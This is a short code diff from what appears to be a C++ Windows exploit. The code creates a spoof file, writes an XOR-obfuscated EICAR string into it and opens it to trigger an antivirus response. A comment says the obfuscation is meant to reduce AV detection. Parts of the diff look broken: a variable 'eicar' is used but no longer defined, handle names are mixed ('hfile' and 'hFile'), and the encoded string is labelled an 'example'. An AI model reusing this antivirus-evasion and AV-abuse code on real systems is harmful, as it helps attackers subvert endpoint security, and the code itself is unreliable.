@@ -14,7 +14,15 @@
 #pragma comment(lib,"sas.lib")
 #pragma comment(lib,"ntdll.lib")
 #pragma comment(lib,"CldApi.lib")
-
+// XOR-obfuscated EICAR to reduce AV detection (simple key 0x0F - change if needed)
+std::string getEICAR() {
+    std::string encoded = "Y5P!Q%@BQ[5\\QZY65)Q^)8DD]59}D^G]";  // Example XORed EICAR
+    std::string decoded;
+    for (char c : encoded) {
+        decoded += c ^ 0x0F;   // XOR decode
+    }
+    return decoded;
+}
 
 typedef struct _FILE_DISPOSITION_INFORMATION_EX {
     ULONG Flags;
@@ -618,19 +626,12 @@ int main()
         printf("Failed create spoof work file.\n");
         return 1;
     }
-// Simple XOR obfuscation example - replace the EICAR write section with this
-std::string getEICAR() {
-    std::string encoded = "Y5P!Q%@BQ[5\\QZY65)Q^)8DD]59}D^G]";  // XORed version of EICAR (example - adjust key)
-    std::string decoded;
-    for (char c : encoded) {
-        decoded += c ^ 0x0F;  // XOR with a simple key (change 0x0F to anything)
-    }
-    return decoded;
-}
+
     rev(eicar);
     DWORD nwf = 0;
-    WriteFile(hfile, getEICAR(), sizeof(getEICAR()) - 1, &nwf, NULL);
-    
+    std::string content = getEICAR();
+    DWORD dwWritten = 0;
+    WriteFile(hFile, content.c_str(), static_cast<DWORD>(content.length()), &dwWritten, NULL);    
     // trigger AV response
     CreateFile(foo, GENERIC_READ | FILE_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (WaitForSingleObject(gevent, 120000) != WAIT_OBJECT_0)
